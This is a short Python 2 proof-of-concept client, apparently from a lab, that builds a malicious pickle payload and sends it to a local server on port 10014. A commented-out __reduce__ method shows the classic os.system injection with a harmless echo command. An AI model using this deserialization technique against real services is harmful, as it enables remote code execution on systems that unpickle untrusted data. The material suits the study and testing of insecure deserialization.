import sys
import os
import pickle
import socket
import codec

# define our object to be serialized
# class surprise(object):

#     def __reduce__(self):
#         return (os.system, ('echo ATTACK_SUCCESSFUL',),)


# define our object to be serialized
class surprise(object):
    data = "serialized_data"

    def __reduce__(self):
        encoded = codec.myEncode(self.data);
        return (codec.myDecode, (encoded,),)


# check if an argument is present
if len(sys.argv) > 1:
    myStr = sys.argv[1]
else:
    myStr = "no_arg"


# serialize our suprise object into a payload
obj = surprise()
obj.data = myStr
payload = pickle.dumps(obj)

# print the payload data
print "-------------------Start Payload-------------------"
print payload
print "--------------------End Payload--------------------"

# connect to server
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect (('localhost', 10014))

print "----------------Start Received Data----------------"
print soc.recv(1024)
print "-----------------End Received Data-----------------"

# send the payload
soc.send(payload)
soc.close()
